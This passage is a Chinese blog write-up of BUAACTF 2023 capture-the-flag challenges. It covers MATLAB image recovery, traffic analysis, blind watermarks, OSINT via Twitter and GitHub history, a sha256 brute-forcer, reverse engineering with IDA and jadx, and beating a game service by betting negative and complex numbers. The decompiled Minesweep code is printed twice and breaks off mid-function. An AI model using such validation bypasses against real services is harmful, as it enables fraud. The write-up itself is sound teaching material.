alt="enc1.m"></p><p>剩下两个文件<code>enc.png</code>和<code>enc2.py</code>分别打开，发现<code>enc.png</code>并不能打开为图片文件，而<code>enc.py</code>是我看不懂的一份python，所以<del>我们先不管他</del>。</p><blockquote><p>建议会密码学的可以研究一下这份代码，但是鼠鼠我完全不会密码学，所以我选择了忽视。</p></blockquote><p>注意到有一份没有后缀名的<code>gift4u</code>文件，用winHex打开之后发现其文件头有一串MATLAB的说明，则猜测其为MATLAB下的一种文件。</p><p><img src="\img\BUAACTF\微信截图_20230426144731.png" alt="gift4u用winHex打开"></p><p>因为有一份MATLAB的代码，所以优先考虑是不是<code>.m</code>文件，可惜并打不开。</p><p>通过万能的互联网搜索我们可以知道，MATLAB的数据文件<code>.mat</code>符合这样的文件头格式，所以我们将其改为<code>.mat</code>，然后用MATLAB打开，可以发现这份文件正对应着<code>enc1.m</code>中的变量。</p><p><img src="\img\BUAACTF\微信截图_20230426145057.png" alt="gift4u.mat"></p><p>在之前的代码中我们可以知道<code>W</code>变量对应着从<code>flag.png</code>中提取出来的数据，所以我们直接将<code>W</code>变量写入<code>flag.png</code>。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">imwrite(W,<span class="hljs-string">&#x27;flag.png&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这样我们就得到了<code>flag.png</code>。</p><p><img src="\img\BUAACTF\微信截图_20230426145447.png" alt="flag"></p><p>此题有一个小插曲，因为作者过于<del>SB</del>导致肉眼识别flag失败，多打了一个<code>_</code>，本想前去拷打出题人结果被出题人狠狠拷打。</p><p><img src="\img\BUAACTF\QQ图片20230426145705.jpg" alt="罪证"></p><p><img src="\img\BUAACTF\微信截图_20230426145816.png" alt="被狠狠拷打"></p><h3 id="2、zhuzhu’s-revenge"><a href="#2、zhuzhu’s-revenge" class="headerlink" title="2、zhuzhu’s revenge*"></a>2、zhuzhu’s revenge*</h3><blockquote><p>X2藏flag的时候不小心把中间数据给你们了，现在他带着完全版回来了！</p></blockquote><p>同上一题一样，我们直接下载文件之后解压发现跟上一题的文件几乎完全相同。</p><p>所以我们同样的直接打开MATLAB然后<del>熟练地</del>改掉<code>gift4u</code>的后缀名将其导入。</p><p>发现如题目描述所说的一样，出题人真的没有直接给我们<code>W</code>矩阵的数据，真的是<del>丧尽天良</del>！</p><p>但是我们可以敏锐的发现，出题人仍然不小心给了我们足够的中间数据，所以我们也不用去看<code>enc2.py</code>。</p><p><img src="\img\BUAACTF\微信截图_20230426150827.png" alt="打开文件"></p><p>我们想要的数据是<code>W</code>矩阵，而我们发现<code>W</code>矩阵被分解为了<code>Uw</code>,<code>Sw</code>,<code>Vw</code>三个奇异值，那么意味着我们用这三个奇异值可以反向计算出<code>W</code>矩阵。</p><p>但是我们发现，万恶的出题人同时给我们删掉了我们需要的<code>Sw</code>矩阵。</p><p>接着向下分析我们可以发现，<code>Sw</code>矩阵可以用<code>S2</code>矩阵逆推，但是出题人也没给我们<code>S2</code>矩阵。</p><p>那就接着向下分析，我们可以发现，<code>S2</code>矩阵居然可以用<code>LL2</code>,<code>U</code>,<code>V</code>三个矩阵逆推出来，但是出题人只给了我们<code>LL2</code>矩阵，<del>这不是什么好文明</del>。</p><p>但是<code>U</code>,<code>S</code>,<code>V</code>是<code>LL</code>矩阵分解的奇异值，而我们有<code>LL</code>矩阵，所以逻辑闭环，从后往前逆推就可以计算。</p><p>这里附上逆推的代码，其中用奇异值反推矩阵的方式来自神奇的ChatGPT，大家可以自己去搜索。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs matlab">[U,S,V]=svd(LL);<br>S2=LL2/U/V&#x27;;<br>af=<span class="hljs-number">0.514</span>;<br>Sw=(S2-S)/af;<br>sigma=<span class="hljs-built_in">diag</span>(Sw);<br>Img=Uw*<span class="hljs-built_in">diag</span>(sigma)*Vw&#x27;;<br>imwrite(\img,<span class="hljs-string">&#x27;flag.png&#x27;</span>);<br></code></pre></td></tr></table></figure><p>然后我们就得到了如下flag。</p><p><img src="\img\BUAACTF\微信截图_20230426151704.png" alt="flag"></p><p>但是我们交上去并不对，这次在确保了自己的眼睛完全没有出现任何问题之后，我选择了再次拷打出题人。</p><p><img src="\img\BUAACTF\微信截图_20230426151816.png" alt="拷打！"></p><p>拷打出题人成功，获得flag。</p><blockquote><p>注：出题人对我们完全不需要用enc2.py<del>感到十分高兴</del></p><p><img src="\img\BUAACTF\微信截图_20230426150722.png" alt=""></p></blockquote><h3 id="3、Which-Element"><a href="#3、Which-Element" class="headerlink" title="3、Which Element*"></a>3、Which Element*</h3><blockquote><p>小z同学的师傅为了考验小z，将炼制“再无ddl”药的最后一种配方元素藏到了文件中，小z同学承诺如果你帮他解出答案，他炼制出药后会给你一份，你愿意帮助他吗？</p><p>hint1：Try search “6 color block cipher”.</p></blockquote><p>下载了文件之后，我们发现这是一个流量分析题。</p><p>将流量包直接扔到WireShark中分析，发现其中有很多<code>TCP</code>流量和一些<code>http</code>流量，筛选出其中<code>http</code>流量。</p><p><img src="\img\BUAACTF\微信截图_20230426152653.png" alt="筛选http"></p><p>发现是用户与服务器的应答流量包，直接抓取其分组字节流然后保存到本地，我们可以得到四个文件，分别为<code>fakepw.png</code>,<code>flag.wav</code>,<code>passwd.png</code>,<code>flag.zip</code>四个文件。</p><p><img src="\img\BUAACTF\微信截图_20230426153741.png" alt="抓取文件"></p><p>用<code>Audacity</code>打开<code>flag.wav</code>我们可以得到摩斯电码的图像，手动分离之后解码，发现是个骗子！</p><p><del>恭喜我们又浪费了几分钟的时间。</del></p><p>打开<code>flag.zip</code>我们可以发现这个压缩包有密码，因为不想winHex看加密，所以我选择了直接扔到<code>ZenCenOp</code>里面去解伪加密，发现解密成功，随后解压，发现文件损坏，修复损坏文件之后发现密码又回来了！所以我们可以知道这个zip是个真加密。</p><p><del>恭喜我们又浪费了几分钟的时间。</del></p><p>然后就是攻克<code>passwd.png</code>的时间，但是发现这个东西不能够解密一点点。</p><blockquote><p>那是一个焦头烂额的晚上，CoolWind正对着一张彩色图片<del>疯狂发电</del>。</p><p>他实在是无法得到图片中的秘密，所以他使用了「奥义之球球hint之术」</p><p>终于出题人经受不住考验给出了hint：Try search “6 color block cipher”.</p></blockquote><p>我们百度此关键词无果，只能使用科学去谷歌搜索，果不其然我们很容易就得到了如下图片：</p><p><img src="\img\BUAACTF\QQ图片20230426154920.png" alt="密码表"></p><p>用此密码表对应所给的<code>passwd.png</code>我们可以得到压缩包的密码为<code>3.1415</code>。</p><p>解压压缩包得到如下三个文件：</p><p><img src="\img\BUAACTF\微信截图_20230426155102.png" alt="解压"></p><p>把<code>hint.png</code>扔到winHex中分析可以在文件的最后得到一串<code>base64</code>：</p><p><img src="\img\BUAACTF\微信截图_20230426160836.png" alt="hex分析"></p><p>解密之后可以得到一句话：<code>What&#39;s that in my hand</code></p><p>通过识图可以知道图片中的人是托里拆利，其手中拿的东西是水银气压计。</p><p>到了这里我们完全看不懂这个hint，在<del>报答出题人</del>之后我们了解到这个题和图片的频域变换有关，搜索相关知识我们可以知道，CTF中常用的一种关于图片的频域变换的加密是盲水印。</p><p>所以我们此时就可以理解这个hint：“水银”意味着“水印”。</p><blockquote><p>这是一个很烂的谐音梗，是一个坏文明，大家不要学习</p></blockquote><p>所以用<code>BlindWaterMark-master</code>，<code>python2</code>直接运行或者<code>python3</code>使用<code>--oldseed</code>运行即可得到其中盲水印。</p><blockquote><p>此处python3版本不能过高，不然在运行时会报错，因为脚本中使用了一个最新版中已经被删除的语法。</p></blockquote><p>因此我们可以得到flag：</p><p><img src="\img\BUAACTF\微信图片_20230426161525.png" alt="盲水印"></p><h3 id="4、ChatGPT"><a href="#4、ChatGPT" class="headerlink" title="4、ChatGPT"></a>4、ChatGPT</h3><blockquote><p>都什么年代了还在玩传统chatgpt，试试这个能赚money的（</p><p>复现环境地址：nc 10.212.27.23 23693</p></blockquote><p>用<code>Ubuntu</code>打开地址，跳出一串随机的sha256编码。</p><p><img src="\img\BUAACTF\微信截图_20230426165248.png" alt="sha256"></p><p>通过python编写<code>sha256</code>碰撞代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br>flag_sha256=<span class="hljs-string">&quot;339e60716779f7b89754eb7e306a6a040d2b951661113ee160badd9f9d6c2b35&quot;</span><br>strs=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~ &quot;</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> strs:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> strs:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> strs:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> strs:<br>                code=sha256()<br>               flag=<span class="hljs-built_in">str</span>(a)+<span class="hljs-built_in">str</span>(b)+<span class="hljs-built_in">str</span>(c)+<span class="hljs-built_in">str</span>(d)+<span class="hljs-string">&#x27;ZFtxnRN3yVBvVKH7l2neXJfDDMzY&#x27;</span><br>                code.update(flag.encode())<br>                <span class="hljs-keyword">if</span> code.hexdigest()==flag_sha256:<br>                    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>进行<code>sha256</code>碰撞可以得出<code>XXXX</code>为<code>QtKr</code></p><blockquote><p>每次给的密码是随机的，因此需要自行进行sha256碰撞</p></blockquote><p>进入ChatGPT，进行答题。</p><p>输入<code>/exam</code>可以进行答题，里面题目的答案需要大家自己探索，绝对不是因为<del>作者不会</del>。</p><p>成功答对所给的所有题目之后我们可以得到第一段flag是<code>BUAACTF&#123;C0Ngr@~tuLati0N5_Y0u_R~</code>。</p><p>之后输入<code>/pss</code>可以和gpt进行猜拳游戏。结果可想而知，有一方后出的猜拳游戏是<del>十分公平的</del>，所以gpt会一直赢，那么我们就要思考如何hack。</p><p>既然输会扣掉相对应的钱，那么如果我们bet一个负数会怎么样呢？</p><p><img src="\img\BUAACTF\微信截图_20230426205843.png" alt="hack /pss"></p><p>惊喜的发现我们得到了很多<code>money1</code>，成功的hack了<code>/pss</code>。</p><p>那么来到<code>/hard-pss</code>我们同样输入负整数，会发现提示<code>No hack!</code>证明直接输入负数的方式不能再次hack。</p><p>但是我们可以发现，不论我们bet多少整数的<code>money2</code>，其数量不会减少并且<code>money2</code>会变成<code>0.0</code>的浮点数。</p><p>通过查询<code>python</code>的数据类型可以知道，<code>python</code>的数据类型有整数、浮点数、复数。既然整数和浮点数都不行，那么为什么不试试复数呢？</p><p><img src="\img\BUAACTF\微信截图_20230426210358.png" alt="hack /hard-pss"></p><p>啊哈！又从gpt那里搞了好多米！</p><p>这样我们就可以愉快的去买flag了。</p><p>消费<code>money1</code>可以买到第二段flag：<code>4~r3a1_MA5Ter_of_0ur_s1llY_CH@t</code></p><p>消费<code>money2</code>可以买到第三段flag：<code>gpT__5_L0vvvvv3_fr0m_M1sc!&#125;</code></p><p>将三段flag拼起来我们可以得到完整的flag：</p><p><code>BUAACTF&#123;C0Ngr@~tuLati0N5_Y0u_R~4~r3a1_MA5Ter_of_0ur_s1llY_CH@tgpT__5_L0vvvvv3_fr0m_M1sc!&#125;</code></p><h3 id="5、Screenshot"><a href="#5、Screenshot" class="headerlink" title="5、Screenshot"></a>5、Screenshot</h3><blockquote><p>小橘子在没事干的时候特别喜欢在各大社交平台灌水，某天他在某平台高强度冲浪的时候遇到了一位自称是BUAACTF2023出题人的网友。在交谈过程中，该网友不小心发送了一张电脑屏幕截图，这引起了小橘子的注意。如果能通过这张图片找到一些有用的信息，或许就能提前拿到比赛的flag……</p><p>小橘子在该社交平台上的id：@PaulGeo43512452</p></blockquote><p>如果经常surfing freely on the Internet的朋友们看到这样的id会想到什么呢？</p><p>对了！要么是微博，要么是小蓝鸟。继续查看给我们的Screenshot：</p><p><img src="\img\BUAACTF\screenshot.jpg" alt="Screenshot"></p><p>我们可以发现右上角有很明显的小蓝鸟，因此我们可以锁定该id就是小蓝鸟id。</p><p>我们使用科学登录小蓝鸟之后搜索该id之后可以在Replies里面看到如下推文：</p><p><img src="\img\BUAACTF\微信截图_20230426211136.png" alt="Replies"></p><p>发现了一样的截图，这样我们就可以点开发送者@master0751的原版推文进行查看：</p><p><img src="\img\BUAACTF\微信截图_20230426211247.png" alt="推文"></p><p>可以知道原作者给出的线索指向其github。</p><p>在个人主页中可以找到github账号，进入github并搜索，可以发现这个github账号下有且只有一个blog的仓库：</p><p><img src="\img\BUAACTF\微信截图_20230426211538.png" alt="github"></p><p>我们可以看到有几个库在近期被修改过，因此可以知道出题人更新了这些库，而打开之后可以发现这些库都有关于文章的推送，所以我们可以查看其对于仓库的修改来试图查询flag。</p><p>点击任意一个文件中间的<code>Site updated</code>我们可以进入其历史修改记录的查询页面。</p><p>在这里我们可以发现有一篇文章被完全删掉了，题目为BUAACTF2022题解。</p><p>我们直接将其源码复制下来，在本地新建一个txt将源码复制进去之后将后缀改为<code>.html</code>等图片刷新一会可以得到如下网页：</p><p><img src="\img\BUAACTF\微信截图_20230426212153.png" alt="screenshot.html"></p><p>显而易见，我们得到了flag。</p><h3 id="6、签到"><a href="#6、签到" class="headerlink" title="6、签到"></a>6、签到</h3><blockquote><p>别问为什么在这里，问就是后补的</p></blockquote><p>打开所给链接，是o4ange战队的官方blog。</p><p>点开About页自然看到flag</p><p><img src="\img\BUAACTF\微信截图_20230426233613.png" alt=""></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1、mota"><a href="#1、mota" class="headerlink" title="1、mota"></a>1、mota</h3><blockquote><p>鼠鼠很菜，只能签到</p></blockquote><p>打开链接，发现是一个爬塔游戏。</p><p>点击f12进入开发者模式，打开<code>network</code>并刷新获取其源代码。</p><p>注意到<code>Events.js</code>，双击打开。</p><p><img src="\img\BUAACTF\微信截图_20230426233956.png" alt=""></p><p>一般都是在游戏的最后给出flag，因此我们直接拉到最后可以发现如下语句：</p><p><img src="\img\BUAACTF\微信截图_20230426234201.png" alt=""></p><p>将两句话在Node.js中打开可以率先得到最后一段flag：</p><p><img src="\img\BUAACTF\微信截图_20230426234311.png" alt="最后一段flag"></p><p>除此之外我们可以知道我们的flag都是这个叫<code>Npc=3,仙子</code>的npc给出的，所以直接在网页中搜索可得到第一段铭文储存的flag：</p><p><img src="\img\BUAACTF\微信截图_20230426234452.png" alt="第一段flag"></p><p>和第二段加密flag：</p><p><img src="\img\BUAACTF\微信截图_20230426234605.png" alt="第二段flag"></p><p>扔到Node.js中解码：</p><p><img src="\img\BUAACTF\微信截图_20230426234656.png" alt=""></p><p>可得第二段flag，故完整flag为：</p><p><code>BUAACTF&#123;HT5_mota_1s_s0_fun!&#125;</code></p><h2 id="Reserve向"><a href="#Reserve向" class="headerlink" title="Reserve向"></a>Reserve向</h2><h3 id="1、Snake"><a href="#1、Snake" class="headerlink" title="1、Snake"></a>1、Snake</h3><p>下载exe之后用ida64打开，找到main函数并且反编译可以得到如下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  _main(argc, argv, envp);<br>  <span class="hljs-built_in">init</span>();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">draw</span>();<br>    <span class="hljs-built_in">move</span>();<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-built_in">check_game_over</span>() )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\nGame Over!&quot;</span>);<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( score &gt; <span class="hljs-number">79</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">0xA</span>u);<br>  &#125;<br>  <span class="hljs-built_in">decrypt_flag</span>();<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Congratulations! Here it is. %s\n&quot;</span>, flag);<br>LABEL_7:<br>  <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以知道逻辑是如果score如果大于79胜利得到flag，因此使用动态调试调整内存。</p><p>首先我们可以知道score变量存在<code>0000000000408020</code>内存处，在调试中找到并且修改</p><p><img src="\img\BUAACTF\微信截图_20230427000103.png" alt="修改内存"></p><p>得到flag：<code>BUAACTF&#123;debug_1s_useful&#125;</code></p><p><img src="\img\BUAACTF\微信截图_20230427000216.png" alt=""></p><h3 id="2、oneQuiz’s-revenge"><a href="#2、oneQuiz’s-revenge" class="headerlink" title="2、oneQuiz’s revenge*"></a>2、oneQuiz’s revenge*</h3><p>下载了一个安卓apk文件，用模拟器打开可以得到这样的界面：</p><p><img src="\img\BUAACTF\微信图片_20230427000449.png" alt=""></p><p>看起来像上下左右走的方向，所以猜测是一个迷宫。</p><blockquote><p>但是我做的时候并没有猜出来这是一个迷宫</p></blockquote><p>用jadx-gui打开进行逆向可以得到java的码，打开<code>AndroidManifest.xml</code>查看可以知道主函数看起来就是一个迷宫的样子。</p><p><img src="\img\BUAACTF\微信截图_20230427000811.png" alt="主函数"></p><p>通过分析代码可以知道，我们成功的条件是当<code>v2 == 11 &amp;&amp; v3 == 11</code>时我们走过路径的英文字母所构成的字符串。将其中v1列表的列表复制出来并且变成二维：</p><p><img src="\img\BUAACTF\微信图片_20230427001105.png" alt="迷宫"></p><p>可知我们的目标就是从(2,2)的位置走到<code>*</code>的位置，因此：</p><p><img src="\img\BUAACTF\微信图片_202304270011051.png" alt=""></p><p>走出迷宫，根据摁键顺序得到flag：<code>VaaaVaVVaaaaaVVVVAAJJAAVVVAVVaaaaaJa</code></p><h3 id="3、Minesweep"><a href="#3、Minesweep" class="headerlink" title="3、Minesweep"></a>3、Minesweep</h3><p>不是很经典的扫雷游戏。</p><p>用ida64逆向并获取其主函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> flag[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+21h] [rbp-4Fh] BYREF</span><br>  <span class="hljs-type">char</span> show[<span class="hljs-number">7</span>][<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [rsp+64h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+6Ch] [rbp-4h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+70h] [rbp+0h] BYREF</span><br><br>  _main();<br>  input = <span class="hljs-number">0</span>;<br>  j = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">6</span>; ++j )<br>      *((_BYTE *)&amp;savedregs + <span class="hljs-number">7</span> * i + j - <span class="hljs-number">64</span>) = <span class="hljs-number">42</span>;<br>  &#125;<br>  <span class="hljs-built_in">menu</span>();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;byte_4050FE);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>    <span class="hljs-keyword">if</span> ( input == <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( !input )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;byte_405112);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(&amp;byte_40511D);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;byte_405109);<br>  <span class="hljs-built_in">Game</span>(show);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(flag) == <span class="hljs-number">14</span> )<br>  &#123;<br>    <span class="hljs-built_in">encrypt</span>(flag);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(flag, result) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Succeed!!!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong lenth!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> flag[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+21h] [rbp-4Fh] BYREF</span><br>  <span class="hljs-type">char</span> show[<span class="hljs-number">7</span>][<span class="hljs-number">7</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> input; <span class="hljs-comment">// [rsp+64h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+6Ch] [rbp-4h]</span><br>  __int64 savedregs; <span class="hljs-comment">// [rsp+70h] [rbp+0h] BYREF</span><br><br>  _main();<br>  input = <span class="hljs-number">0</span>;<br>  j = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">6</span>; ++j )<br>      *((_BYTE *)&amp;savedregs + <span class="hljs-number">7</span> * i + j - <span class="hljs-number">64</span>) = <span class="hljs-number">42</span>;<br>  &#125;<br>  <span class="hljs-built_in">menu</span>();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;byte_4050FE);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;input);<br>    <span class="hljs-keyword">if</span> ( input == <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( !input )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(&amp;byte_405112);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(&amp;byte_40511D);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(&amp;byte_405109);<br>  <span class="hljs-built_in">Game</span>(show);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, flag);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(flag) == <span class="hljs-number">14</span> )<br>  &#123;<br>    <span class="hljs-built_in">encrypt</span>(flag);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(flag, result) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Succeed!!!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong lenth!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先可以知道flag长度为14位。查看encrypt函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> __cdecl <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-type">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> temp; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+24h] [rbp-5Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+28h] [rbp-58h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+2Ch] [rbp-54h]</span><br><br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-built_in">strlen</span>(s) - <span class="hljs-number">7</span>; ++k )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( s[k] &gt; <span class="hljs-number">96</span> &amp;&amp; s[k] &lt;= <span class="hljs-number">122</span> )<br>    &#123;<br>      temp = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">6</span>; ++i )<br>      &#123;<br>        <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">6</span>; ++j )<br>          temp += (s[k + <span class="hljs-number">1</span> + i] - <span class="hljs-number">97</span>) ^ (mine[<span class="hljs-number">8</span> * i + j] - <span class="hljs-number">97</span>);<br>      